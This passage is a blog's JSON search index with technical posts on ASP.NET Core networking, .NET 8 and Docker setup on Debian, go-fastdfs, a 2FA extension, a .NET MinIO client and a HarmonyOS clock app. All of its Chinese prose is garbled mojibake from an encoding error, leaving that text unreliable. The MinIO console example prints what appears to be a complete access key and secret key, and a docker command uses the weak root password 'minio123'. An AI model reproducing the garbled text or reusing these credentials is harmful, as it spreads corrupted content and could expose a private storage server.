æ—¶ï¼Œä¸è¦ä½¿ç”¨ localhostï¼Œè€Œæ˜¯ä½¿ç”¨ 0.0.0.0ï¼š 1app.Urls.Add(&quot;http://0.0.0.0:5000&quot;); æ£€æŸ¥é˜²ç«å¢™è®¾ç½®ï¼šç¡®ä¿ä½ çš„ Debian ç³»ç»Ÿä¸Šçš„é˜²ç«å¢™æ²¡æœ‰é˜»æ­¢å¤–éƒ¨è®¿é—®ç«¯å£ 5000ã€‚ä½ å¯ä»¥ä½¿ç”¨ ufw å‘½ä»¤è¡Œå·¥å…·æ¥ç®¡ç†é˜²ç«å¢™è§„åˆ™ã€‚ä¾‹å¦‚ï¼Œå…è®¸ç«¯å£ 5000 å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼š sudo ufw allow 5000&#x2F;tcpæ£€æŸ¥ç½‘ç»œé…ç½®ï¼šç¡®ä¿ä½ çš„ç½‘ç»œé…ç½®å…è®¸å¤–éƒ¨è®¿é—®ã€‚è¿™å¯èƒ½æ¶‰åŠåˆ°è™šæ‹Ÿç½‘ç»œã€å®¹å™¨ç½‘ç»œæˆ–å…¶ä»–ç½‘ç»œéš”ç¦»æŠ€æœ¯ã€‚ ä½¿ç”¨ç¯å¢ƒå˜é‡ï¼šASP.NET Core åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡æ¥è®¾ç½® URLã€‚ä½ å¯ä»¥è®¾ç½® ASPNETCORE_URLS ç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨è¿è¡Œåº”ç”¨ç¨‹åºä¹‹å‰ä¸æŒ‡å®šå…·ä½“çš„ app.Urls.Addï¼š export ASPNETCORE_URLS&#x3D;http://0.0.0.0:5000dotnet runæ£€æŸ¥ Kestrel æœåŠ¡å™¨é…ç½®ï¼šKestrel æ˜¯ ASP.NET Core çš„é»˜è®¤ HTTP æœåŠ¡å™¨ï¼Œå®ƒå¯èƒ½æœ‰è‡ªå·±çš„é…ç½®ã€‚ç¡®ä¿ Kestrel é…ç½®ä¸ºç›‘å¬æ‰€æœ‰æ¥å£ã€‚è¿™å¯ä»¥åœ¨ Program ç±»ä¸­è®¾ç½®ï¼š 1234builder.WebHost.ConfigureKestrel(serverOptions =&gt;&#123; serverOptions.ListenAnyIP(5000);&#125;); æ£€æŸ¥ç«¯å£æ˜¯å¦è¢«å ç”¨ï¼šç¡®ä¿ç«¯å£ 5000 æ²¡æœ‰è¢«å…¶ä»–æœåŠ¡å ç”¨ã€‚ä½ å¯ä»¥ä½¿ç”¨ netstat -tuln | grep 5000 æ¥æ£€æŸ¥ç«¯å£çš„ä½¿ç”¨æƒ…å†µã€‚ ä½¿ç”¨ dotnet å‘½ä»¤çš„é¢å¤–å‚æ•°ï¼šå½“ä½ ä½¿ç”¨ dotnet run å‘½ä»¤æ—¶ï¼Œå¯ä»¥é€šè¿‡ -urls å‚æ•°æ¥æŒ‡å®š URLï¼Œä¾‹å¦‚ï¼š 1dotnet run --urls &quot;http://0.0.0.0:5000&quot; dibian .NET8ç¯å¢ƒæ³¨å†Œå¾®è½¯å¯†é’¥å’Œè½¯ä»¶ä»“åº“ã€‚ 12wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.deb å®‰è£….NET SDKã€‚ 1234sudo apt-get update; \\sudo apt-get install -y apt-transport-https &amp;&amp; \\sudo apt-get update &amp;&amp; \\sudo apt-get install -y dotnet-sdk-8.0 éªŒè¯å®‰è£…ã€‚ 1dotnet --version","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"VM Linux win","slug":"VM-Linux-win","date":"2024-06-24T15:38:07.000Z","updated":"2024-06-26T17:02:40.000Z","comments":true,"path":"2024/06/24/VM-Linux-win/","permalink":"https://banjinmei.github.io/2024/06/24/VM-Linux-win/","excerpt":"","text":"debian12.5.0æœåŠ¡å™¨å®‰è£…å‚è€ƒhttps://blog.csdn.net/Go_ahead_forever/article/details/132679793 ç›¸å…³å‘½ä»¤é—®é¢˜æ–°ç”¨æˆ·ä½¿ç”¨sudoæŠ¥é”™ xx is not the sudoers file.åŸå› ï¼šbookç”¨æˆ·æ²¡æœ‰sudoçš„æƒé™è§£å†³ï¼šhttps://blog.csdn.net/weixin_37787043/article/details/123045557 æ›´æ–° æ¸…å-é•œåƒæº (ä¼šå¿«ä¸€äº›)ï¼šå‚è€ƒæ–‡æ¡£ï¼š https://blog.csdn.net/sinat_15028281/article/details/135638596 123su rootcp etc/apt/sources.list etc/apt/sources.list.backup // å¤‡ä»½vi etc/apt/sources.list // ä¿®æ”¹é•œåƒæº å°†etc&#x2F;apt&#x2F;sources.listæ–‡ä»¶å†…çš„å†…å®¹æ¸…ç©ºï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š 1234567891011deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware# deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware å®‰è£…SSHå®‰è£…ï¼š 1sudo apt-get install ssh å¯åŠ¨ï¼š 1sudo systemctl start ssh å¯åŠ¨åˆ™å¯sshæŸ¥çœ‹ï¼š 1sudo systemctl status ssh å®‰è£…vscodeè¿›å…¥é¡µé¢ï¼šhttps://code.visualstudio.com/docs/?dv=linux64_deb è‡ªåŠ¨ä¸‹è½½å®‰è£…åŒ… cd downloadsæ‰¾åˆ°ä¸‹è½½ç›®å½•æ‰§è¡Œï¼š 1sudo dpkg -i code_1.88.1-1712771838_amd64.deb å®‰è£…dockerDebian12.5: https://blog.csdn.net/qq_39997939/article/details/131405963 ä¸¥æ ¼æŒ‰æ­¥éª¤å¤åˆ¶å³å¯ã€‚ åˆ«ç”¨å…¶ä»–ç½‘ç«™çš„å®‰è£…æ–¹å¼ï¼Œå¾ˆå®¹æ˜“é”™ï¼ï¼ï¼ï¼ï¼ Ubuntu18.04: ubuntu18.04å®‰è£…docker_ubuntu 18.04å®‰è£…docker-CSDNåšå®¢ å®‰è£…æ„å»ºåŸºç¡€åŒ…å®ƒå«æœ‰libcã€gccã€g++ã€makeã€dpkg-devæ‰§è¡Œå‘½ä»¤ï¼š 1sudo apt update &amp;&amp; sudo apt install build-essential winhttps://blog.csdn.net/weixin_52799373/article/details/139039181 winæµ‹é€šé“xxxhttps://knowledge.broadcom.com/external/article?legacyId=79832","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Linux","slug":"Linux","permalink":"https://banjinmei.github.io/tags/Linux/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"VM","slug":"VM","permalink":"https://banjinmei.github.io/tags/VM/"}],"author":"mu"},{"title":"Go-fastdfs","slug":"Go-fastdfs","date":"2024-06-19T15:58:46.000Z","updated":"2024-12-10T14:31:47.819Z","comments":true,"path":"2024/06/19/Go-fastdfs/","permalink":"https://banjinmei.github.io/2024/06/19/Go-fastdfs/","excerpt":"","text":"go-fastdfsGo-fastdfs æ˜¯ç®€å•ã€å¯é ã€é«˜æ•ˆçš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚ å®‰è£…https://sjqzhang.github.io/go-fastdfs/#character orhttps://github.com/sjqzhang/go-fastdfs/releases å¯åŠ¨1./fileserver server dockeréƒ¨ç½² 1docker run --network=host --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs .NETå‚è€ƒjavaå®ç°https://sjqzhang.github.io/go-fastdfs/usage.html#java 12345678910111213141516171819202122232425262728293031323334353637383940private static readonly string UPLOAD_PATH2 = &quot;go-fastdfsåœ°å€XXX:XX&quot;; [HttpPost(&quot;FormFile&quot;)] public async Task&lt;string&gt; UploadGo(IFormFile file) &#123; if (file == null || file.Length == 0) &#123; return &quot;File is empty&quot;; &#125; string result = string.Empty; try &#123; using (var httpClient = new HttpClient()) &#123; using (var form = new MultipartFormDataContent()) &#123; var streamContent = new StreamContent(file.OpenReadStream()); streamContent.Headers.Add(&quot;Content-Disposition&quot;, $&quot;form-data; name=\\&quot;file\\&quot;; filename=\\&quot;&#123;file.FileName&#125;\\&quot;&quot;); form.Add(streamContent, &quot;file&quot;, file.FileName); form.Add(new StringContent(&quot;default&quot;), &quot;scene&quot;); form.Add(new StringContent(&quot;20240619&quot;), &quot;path&quot;); form.Add(new StringContent(&quot;json2&quot;), &quot;output&quot;); form.Add(new StringContent(&quot;upload&quot;), &quot;submit&quot;); var response = await httpClient.PostAsync(UPLOAD_PATH2, form);//await result = await response.Content.ReadAsStringAsync();//await Console.WriteLine($&quot;resp: &#123;response&#125;&quot;); &#125; &#125; &#125; catch (Exception e) &#123; Console.WriteLine(e.ToString()); &#125; return result; &#125; â€œurlâ€: â€œhttp://xxx/group1/20240619/test1619.png?name=test1619.png&amp;download=1â€œ python1234567import requestsurl = &#x27;http://xxx:xx/group1/upload&#x27;files = &#123;&#x27;file&#x27;: open(&#x27;resized240525.jpg&#x27;, &#x27;rb&#x27;)&#125;options=&#123;&#x27;output&#x27;:&#x27;json&#x27;,&#x27;path&#x27;:&#x27;20240619&#x27;,&#x27;scene&#x27;:&#x27;&#x27;,&#x27;filename&#x27;:&#x27;test123.jpg&#x27;&#125; r = requests.post(url,data=options, files=files)print(r.text) é›†ç¾¤12&quot;peers&quot;: [&quot;http://192.168.44.128:8080&quot;,&quot;http://192.168.31.36:8080&quot;], web managego-fastdfs web - java1.å®‰è£…ä¸‹è½½åœ°å€ï¼šhttps://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gzåˆ° å®˜æ–¹ä¸‹è½½é¡µé¢ ä¸‹è½½æ‰€éœ€çš„ç‰ˆæœ¬(å¸¦jreæˆ–è€…ä¸å¸¦jre) 1wget https://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gz é¡¹ç›®åœ°å€ï¼šhttps://github.com/perfree/go-fastdfs-webå„æ‰“åŒ…ç‰ˆæœ¬ä¸‹è½½åœ°å€ï¼šhttps://github.com/perfree/go-fastdfs-web/releases 2ã€è§£å‹è¿è¡Œï¼š123tar -zxvf go-fastdfs-web-1.3.4.tar.gzcd /opt/go-fastdfs-web/./goFastDfsWeb.sh start ä¹Ÿå¯ä»¥ (javaç¯å¢ƒ)ï¼š 1java -jar go-fastdfs-web.jar 3ã€è®¿é—®ç›‘æ§é¡µé¢ï¼šip:8088 GoFastDfs-Webç®¡ç†å¹³å°å®‰è£…é¡µé¢å®‰è£…å®Œå³å¯ä½¿ç”¨ go_web_ç‰ˆæœ¬https://github.com/perfree/go-fastdfs-web-go","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"2FA-Enable two-factor authentication (2FA)","slug":"2FA-Enable-two-factor-authentication-2FA","date":"2024-06-18T15:40:12.000Z","updated":"2024-06-18T15:47:40.000Z","comments":true,"path":"2024/06/18/2FA-Enable-two-factor-authentication-2FA/","permalink":"https://banjinmei.github.io/2024/06/18/2FA-Enable-two-factor-authentication-2FA/","excerpt":"","text":"å¼€æºå…è´¹çš„Authenticator: 2FA Clientï¼Œæ”¯æŒå¤šç§æµè§ˆå™¨ã€‚ å¼€æºåœ°å€ï¼šAuthenticator-Extensionhttps://github.com/Authenticator-Extension/Authenticator Edgeæ‰©å±•ï¼šAuthenticator: 2FA Client - Microsoft Edge Addonshttps://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio Chromeæ‰©å±•ï¼šèº«ä»½éªŒè¯å™¨ - Chrome åº”ç”¨å•†åº— (google.com)https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai å®‰è£…å¥½è¿™ä¸ªæ‰©å±•ç¨‹åºä»¥åï¼Œå†æ¬¡è¿›å…¥GitHubéªŒè¯ç•Œé¢ï¼Œç­‰å¾…äºŒç»´ç å¼¹å‡ºã€‚ äºŒç»´ç å¼¹å‡ºä»¥åï¼Œç‚¹å‡»æµè§ˆå™¨æ‰©å±•ï¼Œç‚¹å‡»Authenticator: 2FA Client ç‚¹å‡»äºŒç»´ç ï¼Œé€‰æ‹©æŒ‡å®šåŒºåŸŸï¼Œè¿›è¡Œæ“ä½œï¼Œç­‰å¾…ä»£ç å°±å¯ä»¥äº†ã€‚ Enable two-factor authentication (2FA)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"}],"author":"mu"},{"title":".NET MinIO","slug":"NET-MinIO","date":"2024-06-18T15:11:40.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/18/NET-MinIO/","permalink":"https://banjinmei.github.io/2024/06/18/NET-MinIO/","excerpt":"","text":"å®‰è£…MinIOdocker 1docker run --name minio -p 9000:9000 -p 9090:9090 -d -e &quot;MINIO_ROOT_USER=minio&quot; -e &quot;MINIO_ROOT_PASSWORD=minio123&quot; -v /usr/local/minio-data:/data -v /usr/local/minio-config:/root/.minio minio/minio server data --console-address &quot;:9090&quot; --address &quot;:9000&quot; åå°åˆ›å»º Bucketsè®¿é—® localhost:9000 ç™»é™†ååˆ›å»ºBuckets io617 åˆ›å»ºå¯†é’¥Access Keys add package1dotnet add package Minio é…ç½®json12345678//...&quot;Minio&quot;: &#123; &quot;Endpoint&quot;: &quot;192.168.80.xx:9000&quot;,//&quot;localhost:9000&quot;, //90/service-account-credentials &quot;AccessKey&quot;: &quot;EctmxSNB9FqfW6UWxxx&quot;, &quot;SecretKey&quot;: &quot;frQhYoH1k7UphMxbwK2PiG2xKadzPjxxx&quot;, &quot;BucketName&quot;: &quot;io617&quot;&#125;,//... æœåŠ¡ç±»MinioService1234567891011121314151617181920212223242526272829303132333435363738394041424344public class MinioService&#123; private readonly MinioClient _minioClient; private readonly string _bucketName; public MinioService(IConfiguration configuration) &#123; var endpoint = configuration[&quot;Minio:Endpoint&quot;]; var accessKey = configuration[&quot;Minio:AccessKey&quot;]; var secretKey = configuration[&quot;Minio:SecretKey&quot;]; _bucketName = configuration[&quot;Minio:BucketName&quot;]; //http://localhost:9090/api/v1/service-account-credentials _minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build(); &#125; public async Task UploadFileAsync(string objectName, Stream data, long size, string contentType) &#123; await _minioClient.PutObjectAsync(new PutObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithStreamData(data) .WithObjectSize(size) .WithContentType(contentType)); &#125; public async Task&lt;Stream&gt; GetFileAsync(string objectName) &#123; var memoryStream = new MemoryStream(); await _minioClient.GetObjectAsync(new GetObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithCallbackStream((stream) =&gt; &#123; stream.CopyTo(memoryStream); &#125;)); memoryStream.Seek(0, SeekOrigin.Begin); return memoryStream; &#125;&#125; æ³¨å…¥æœåŠ¡1builder.Services.AddSingleton&lt;MinioService&gt;(); ä½¿ç”¨æœåŠ¡1234public HomeController(ILogger&lt;HomeController&gt; logger,MinioService minioService)&#123; _minioService = minioService;//&#125; testcode1234567891011121314151617181920212223242526272829 [HttpGet] public IActionResult Upload() &#123; return View(); &#125; [HttpPost] public async Task&lt;IActionResult&gt; Upload(IFormFile file) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; using (var stream = file.OpenReadStream()) &#123; await _minioService.UploadFileAsync(file.FileName, stream, file.Length, file.ContentType); &#125; ViewBag.Message = &quot;File uploaded successfully!&quot;; &#125; return View(); &#125; [HttpGet] public async Task&lt;IActionResult&gt; Download(string fileName) &#123; var stream = await _minioService.GetFileAsync(fileName); return File(stream, &quot;application/octet-stream&quot;, fileName); &#125;//use https://localhost:7118/Home/download?filename=bx.png 12345678910@using (Html.BeginForm(&quot;Upload&quot;, &quot;Home&quot;, FormMethod.Post, new &#123; enctype = &quot;multipart/form-data&quot; &#125;))&#123; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt;&#125;&lt;div&gt; @ViewBag.Message&lt;/div&gt;&lt;/div&gt; or console 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//TESTstring endpoint = &quot;xxx:9000&quot;;//&quot;localhost:9000&quot;; // string accessKey = &quot;EctmxSNB9FqfW6UWrcAY&quot;; // Access Keystring secretKey = &quot;frQhYoH1k7UphMxbwK2PiG2xKadzPjTE3q9HgHHk&quot;; //Secret Keystring bucketName = &quot;io617&quot;; //Bucketstring filePath = &quot;D:\\\\UploadPath\\\\FileSystem\\\\files\\\\c.jpg&quot;;////.png&quot;; //var minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build();try &#123; // ä¸Šä¼ æ–‡ä»¶ string fileName = Path.GetFileName(filePath); using (var fileStream = File.OpenRead(filePath)) &#123; var startTime = DateTime.Now; var filestream = fileStream; using (filestream) &#123; var file_write_size = filestream.Length; var putObjectArgs = new PutObjectArgs() .WithBucket(bucketName) .WithObject(&quot;obj2222&quot;) .WithStreamData(filestream) .WithObjectSize(filestream.Length) .WithContentType(&quot;application/octet-stream&quot;) .WithHeaders(null); minioClient.PutObjectAsync(putObjectArgs).ConfigureAwait(false);//await &#125; // minioClient.PutObject(bucketName, fileName, fileStream, fileStream.Length);&#125; Console.WriteLine($&quot;File &#123;fileName&#125; uploaded successfully&quot;);&#125;catch (Exception e)&#123; Console.WriteLine($&quot;Error: &#123;e.Message&#125;&quot;);&#125; ä»£ç åˆ›å»ºbucket1234567891011// code create bucketvar beArgs = new BucketExistsArgs() .WithBucket(bucket);bool found = await _minioClient.BucketExistsAsync(beArgs).ConfigureAwait(false);if (!found)&#123; var mbArgs = new MakeBucketArgs() .WithBucket(bucket); await _minioClient.MakeBucketAsync(mbArgs).ConfigureAwait(false);&#125; â€“https://min.io/docs/minio/linux/index.html?ref=con","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"HarmonyOS Next WorldTime  Whack Mole","slug":"HarmonyOS-TeachApp","date":"2024-06-15T15:58:57.000Z","updated":"2024-12-15T04:09:57.494Z","comments":true,"path":"2024/06/15/HarmonyOS-TeachApp/","permalink":"https://banjinmei.github.io/2024/06/15/HarmonyOS-TeachApp/","excerpt":"","text":"HarmonyOS Next WorldTime Whack Mole HarmonyOSåº”ç”¨ é¸¿è’™NEXTå¼€å‘ ä¸–ç•Œæ—¶åº”ç”¨ æ‰“åœ°é¼  ç¯å¢ƒWindows 11DevEco Studio 5.0.1 Release Version: 5.0.5.306HarmonyOS 5.0.1(13)ArkTS ArkUI API 13 WorldTime ä¸–ç•Œæ—¶åº”ç”¨å®ç°æ€è·¯è·å–æ—¶åŒºä¿¡æ¯æ›´æ–°æ—¶é—´æœç´¢åŠŸèƒ½ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191import &#123; i18n &#125; from &#x27;@kit.LocalizationKit&#x27; // å¯¼å…¥å›½é™…åŒ–æ¨¡å—ï¼Œç”¨äºå¤„ç†å¤šè¯­è¨€import &#123; inputMethod &#125; from &#x27;@kit.IMEKit&#x27; // å¯¼å…¥è¾“å…¥æ³•æ¨¡å—@ObservedV2 // è§‚å¯Ÿè€…è£…é¥°å™¨ï¼Œç”¨äºè§‚å¯ŸçŠ¶æ€å˜åŒ–class CityTimeInfo &#123; // å®šä¹‰åŸå¸‚æ—¶é—´ä¿¡æ¯ç±» @Trace cityName: string = &quot;&quot;; // åŸå¸‚åç§°ï¼Œåˆå§‹ä¸ºç©ºå­—ç¬¦ä¸² @Trace currentTime: string = &quot;&quot;; // å½“å‰æ—¶é—´ï¼Œåˆå§‹ä¸ºç©ºå­—ç¬¦ä¸² timeZone: i18n.TimeZone; // æ—¶åŒºå±æ€§ constructor(cityName: string, timeZone: i18n.TimeZone) &#123; // æ„é€ å‡½æ•°ï¼Œæ¥æ”¶åŸå¸‚åç§°å’Œæ—¶åŒº this.cityName = cityName; // è®¾ç½®åŸå¸‚åç§° this.timeZone = timeZone; // è®¾ç½®æ—¶åŒº &#125; @Trace isVisible: boolean = true; // æ˜¯å¦å¯è§ï¼Œåˆå§‹ä¸ºtrue&#125;@Entry // å…¥å£ç»„ä»¶è£…é¥°å™¨@Component // ç»„ä»¶è£…é¥°å™¨struct WorldClockApp &#123; // å®šä¹‰ä¸–ç•Œæ—¶é’Ÿåº”ç”¨ç»„ä»¶ @State private searchText: string = &#x27;&#x27;; // æœç´¢æ–‡æœ¬ï¼Œåˆå§‹ä¸ºç©ºå­—ç¬¦ä¸² @State private cityTimeList: CityTimeInfo[] = []; // åŸå¸‚æ—¶é—´ä¿¡æ¯åˆ—è¡¨ï¼Œåˆå§‹ä¸ºç©ºæ•°ç»„ private lineColor: string = &quot;#e6e6e6&quot;; // è¾¹æ¡†é¢œè‰² private titleBackgroundColor: string = &quot;#f8f8f8&quot;; // æ ‡é¢˜èƒŒæ™¯è‰² private textColor: string = &quot;#333333&quot;; // æ–‡å­—é¢œè‰² private basePadding: number = 4; // å†…è¾¹è· private lineWidth: number = 2; // è¾¹æ¡†å®½åº¦ private rowHeight: number = 50; // è¡Œé«˜ private ratio: number[] = [1, 1]; // åˆ—å®½æ¯”ä¾‹ private textSize: number = 14; // åŸºç¡€å­—ä½“å¤§å° private updateIntervalId = 0; // æ›´æ–°é—´éš”ID updateAllCityTimes() &#123; // æ›´æ–°æ‰€æœ‰åŸå¸‚çš„æ—¶é—´ const locale = i18n.System.getSystemLocale(); // è·å–ç³»ç»Ÿè¯­è¨€ç¯å¢ƒ for (const cityTime of this.cityTimeList) &#123; // éå†åŸå¸‚æ—¶é—´åˆ—è¡¨ const timeZoneId: string = cityTime.timeZone.getID(); // è·å–æ—¶åŒºID const calendar = i18n.getCalendar(locale); // è·å–æ—¥å†å¯¹è±¡ calendar.setTimeZone(timeZoneId); // è®¾ç½®æ—¥å†çš„æ—¶åŒº // è·å–å½“å‰æ—¶é—´çš„å„ä¸ªéƒ¨åˆ† const year = calendar.get(&quot;year&quot;).toString().padStart(4, &#x27;0&#x27;); // å¹´ const month = calendar.get(&quot;month&quot;).toString().padStart(2, &#x27;0&#x27;); // æœˆ const day = calendar.get(&quot;date&quot;).toString().padStart(2, &#x27;0&#x27;); // æ—¥ const hour = calendar.get(&quot;hour_of_day&quot;).toString().padStart(2, &#x27;0&#x27;); // å°æ—¶ const minute = calendar.get(&quot;minute&quot;).toString().padStart(2, &#x27;0&#x27;); // åˆ†é’Ÿ const second = calendar.get(&quot;second&quot;).toString().padStart(2, &#x27;0&#x27;); // ç§’ // æ›´æ–°åŸå¸‚çš„å½“å‰æ—¶é—´å­—ç¬¦ä¸² cityTime.currentTime = `$&#123;year&#125;å¹´$&#123;month&#125;æœˆ$&#123;day&#125;æ—¥ $&#123;hour&#125;:$&#123;minute&#125;:$&#123;second&#125;`; &#125; &#125; onPageShow(): void &#123; // é¡µé¢æ˜¾ç¤ºæ—¶çš„å¤„ç† clearInterval(this.updateIntervalId); // æ¸…é™¤ä¹‹å‰çš„å®šæ—¶å™¨ this.updateIntervalId = setInterval(() =&gt; &#123; // è®¾ç½®æ–°çš„å®šæ—¶å™¨ this.updateAllCityTimes(); // æ¯ç§’æ›´æ–°æ‰€æœ‰åŸå¸‚çš„æ—¶é—´ &#125;, 1000); &#125; onPageHide(): void &#123; // é¡µé¢éšè—æ—¶çš„å¤„ç† clearInterval(this.updateIntervalId); // æ¸…é™¤å®šæ—¶å™¨ &#125; private highlightSearchText(cityTime: CityTimeInfo, keyword: string) &#123; // é«˜äº®æœç´¢æ–‡æœ¬ let text = cityTime.cityName // è·å–åŸå¸‚åç§° if (!keyword) &#123; // å¦‚æœæ²¡æœ‰å…³é”®è¯ cityTime.isVisible = true // è®¾ç½®åŸå¸‚å¯è§ return [text] // è¿”å›åŸå¸‚åç§° &#125; let segments: string[] = []; // å­˜å‚¨åˆ†æ®µæ–‡æœ¬ let lastMatchEnd: number = 0; // ä¸Šä¸€ä¸ªåŒ¹é…ç»“æŸçš„ä½ç½® while (true) &#123; // å¾ªç¯æŸ¥æ‰¾å…³é”®è¯ const matchIndex = text.indexOf(keyword, lastMatchEnd); // æŸ¥æ‰¾å…³é”®è¯ä½ç½® if (matchIndex === -1) &#123; // å¦‚æœæ²¡æœ‰æ‰¾åˆ° segments.push(text.slice(lastMatchEnd)); // æ·»åŠ å‰©ä½™æ–‡æœ¬ break; // é€€å‡ºå¾ªç¯ &#125; else &#123; segments.push(text.slice(lastMatchEnd, matchIndex)); // æ·»åŠ åŒ¹é…å‰çš„æ–‡æœ¬ segments.push(text.slice(matchIndex, matchIndex + keyword.length)); // æ·»åŠ åŒ¹é…çš„å…³é”®è¯ lastMatchEnd = matchIndex + keyword.length; // æ›´æ–°æœ€ååŒ¹é…ç»“æŸä½ç½® &#125; &#125; cityTime.isVisible = (segments.indexOf(keyword) != -1) // è®¾ç½®åŸå¸‚å¯è§æ€§ return segments; // è¿”å›åˆ†æ®µæ–‡æœ¬ &#125; aboutToAppear() &#123; // ç»„ä»¶å³å°†å‡ºç°æ—¶çš„å¤„ç† const timeZoneIds: Array&lt;string&gt; = i18n.TimeZone.getAvailableIDs(); // è·å–å¯ç”¨æ—¶åŒºIDåˆ—è¡¨ this.cityTimeList.push(new CityTimeInfo(&#x27;åŒ—äº¬ (ä¸­å›½)&#x27;, i18n.getTimeZone())); // æ·»åŠ åŒ—äº¬çš„åŸå¸‚æ—¶é—´ä¿¡æ¯ //this.cityTimeList.push(new CityTimeInfo(&#x27;ä¸œäº¬ (æ—¥æœ¬)&#x27;, i18n.getTimeZone())); // æ·»åŠ åŒ—äº¬çš„åŸå¸‚æ—¶é—´ä¿¡æ¯ //this.cityTimeList.push(new CityTimeInfo(&#x27;è´ä¼¦ (å·´è¥¿)&#x27;, i18n.getTimeZone())); // æ·»åŠ åŒ—äº¬çš„åŸå¸‚æ—¶é—´ä¿¡æ¯ for (const id of timeZoneIds) &#123; // éå†æ—¶åŒºID const cityDisplayName = i18n.TimeZone.getCityDisplayName(id.split(&#x27;/&#x27;)[1], &quot;zh-CN&quot;); // è·å–åŸå¸‚æ˜¾ç¤ºåç§° if (cityDisplayName) &#123; // å¦‚æœåŸå¸‚åç§°å­˜åœ¨ this.cityTimeList.push(new CityTimeInfo(cityDisplayName, i18n.getTimeZone(id))); // æ·»åŠ åŸå¸‚æ—¶é—´ä¿¡æ¯ &#125; &#125; this.updateAllCityTimes(); // æ›´æ–°æ‰€æœ‰åŸå¸‚çš„æ—¶é—´ &#125; build() &#123; // æ„å»ºç»„ä»¶çš„UI Column(&#123; space: 0 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´åˆ— Search(&#123; value: $$this.searchText &#125;)// åˆ›å»ºæœç´¢æ¡† .margin(this.basePadding)// è®¾ç½®è¾¹è· .fontFeature(&quot;\\&quot;ss01\\&quot; on&quot;) // è®¾ç½®å­—ä½“ç‰¹æ€§ Column() &#123; // åˆ›å»ºä¸€ä¸ªåˆ— Row() &#123; // åˆ›å»ºä¸€è¡Œ Text(&#x27;åŸå¸‚&#x27;)// æ˜¾ç¤ºâ€œåŸå¸‚â€æ–‡æœ¬ .height(&#x27;100%&#x27;)// é«˜åº¦å æ»¡ .layoutWeight(this.ratio[0])// è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .fontSize(this.textSize)// è®¾ç½®å­—ä½“å¤§å° .fontWeight(600)// è®¾ç½®å­—ä½“ç²—ç»† .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² Line().height(&#x27;100%&#x27;).width(this.lineWidth).backgroundColor(this.lineColor) // åˆ›å»ºåˆ†éš”çº¿ Text(&#x27;æ—¶é—´&#x27;)// æ˜¾ç¤ºâ€œæ—¶é—´â€æ–‡æœ¬ .height(&#x27;100%&#x27;)// é«˜åº¦å æ»¡ 